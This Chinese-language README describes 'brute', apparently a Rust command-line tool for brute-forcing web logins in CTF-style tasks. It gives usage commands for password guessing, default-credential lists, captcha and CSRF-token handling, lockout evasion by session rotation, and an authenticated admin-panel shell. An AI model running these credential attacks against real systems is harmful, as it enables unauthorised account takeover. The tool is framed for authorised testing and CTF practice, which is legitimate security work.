# brute

Web 爆破终端：登录爆破 / 验证码闸门 / 会话轮换 / 已认证 REPL。

> 试验型项目，模块边界清晰（每文件单一职责），后续会进行人工重构。

## 构建

```bash
cargo build --release
# 二进制: target/release/brute
```

## 快速上手

```bash
# 1) POST 表单弱口令爆破（弱口令题）
brute http://target/ \
  --post "user_id=admin&user_pass={}" \
  --fail-contains "user or password is wrong" \
  --dict 弱口令.txt

# 2) 默认口令分类（产品点名时直接打）
brute http://target/login.php \
  --post "user=admin&pass={}" --fail-contains "失败" \
  --defaults eyou

# 3) 验证码题（亿邮网关实战形态）
brute http://target/ \
  --post "user_id=admin&user_pass={}&captcha={captcha}&captcha_ctime={ctime}" \
  --gate-image "code.php:captcha:captcha_ctime" \
  --gate-error "captcha" \
  --fail-contains "user name or password is wrong" \
  --dict pwd.txt
# 取码 → feh/imv 弹窗（无 GUI 则 ASCII 画兜底）→ 人眼输入 → 同会话继续

# 4) CSRF/滑动 token
brute http://target/ \
  --post "user=admin&pass={}&token={tok}" \
  --gate-token "GET /login:name=\"csrf\" value=\"([^\"]+)\"" \
  --gate-token-inject "tok" \
  --fail-contains "error"

# 5) 命中后进已认证 REPL 逛后台
brute http://target/ --dict pwd.txt ... --repl
# brute> get /admin/index.php
# brute> post /admin/action do=flag
# brute> cookie
# brute> exit

# 6) 打法存档 / 复现
brute $URL ... --rule save:eyou
brute --rule eyou        # 一键复现（规则存 rules/ 目录）
```

## 功能

| 模块 | 能力 |
|---|---|
| 认证模式 | GET / POST 表单 / JSON / Basic（`{user}` `{pass}` 占位符） |
| 判别 | `--fail-contains` `--success-contains` `--code`，命中自动提 flag |
| 闸门 | 图片验证码（人工输入）、页面 token（正则自动提取）、万能手动闸门 |
| 会话 | `--lockout` 检测锁定 → 换新会话 + 冷却续跑（字典偏移不丢） |
| 限流 | 429/503/502/504 + 网络错误 → 指数退避；`--interval-ms` 慢速模式 |
| 断点 | `.brute.offset` 字节偏移，`--resume` 续跑 |
| 默认口令 | `--defaults all/eyou/phpmyadmin/tomcat/router/dvr/weblogic` |
| 弹窗 | 命中/事件驱动 notify-send（channel 阻塞，闲置 0 CPU） |
| REPL | 命中后同会话交互：get/post/brute/import/cookie/exit |
| cookie | `--import-cookie` 导入浏览器会话（JS 挑战站点先浏览器解决再塞回来） |

## 架构

```
main.rs       CLI 解析 + 编排
engine.rs     worker 池 / 退避 / checkpoint / 命中处理
auth.rs       认证模式渲染
judge.rs      判别 + flag 提取
gate.rs       闸门环形流程（取→展示/提取→人工输入→注入）
session.rs    client 持有 / cookie 快照 / netscape 导入
interact.rs   已认证 REPL
defaults.rs   内置默认口令库
notify.rs     事件驱动弹窗线程
rules.rs      打法存档/复现
```

## 设计要点

- **会话独占**：cookie jar 只在引擎内部持有，取码与提交同会话，杜绝验证码失配
- **单码多试**：多数登录接口错误密码不消耗验证码，一次人眼输入可跑完整轮字典
- **事件驱动弹窗**：worker 命中才发送事件，通知线程阻塞在 recv()，后台跑字典时 0 CPU 占用
- **浏览器可介入**：JS 挑战站点 → 浏览器拿到 cookie → `--import-cookie` 塞回工具继续爆破

## 免责

仅用于授权测试与 CTF 学习。未授权爆破违法，后果自负。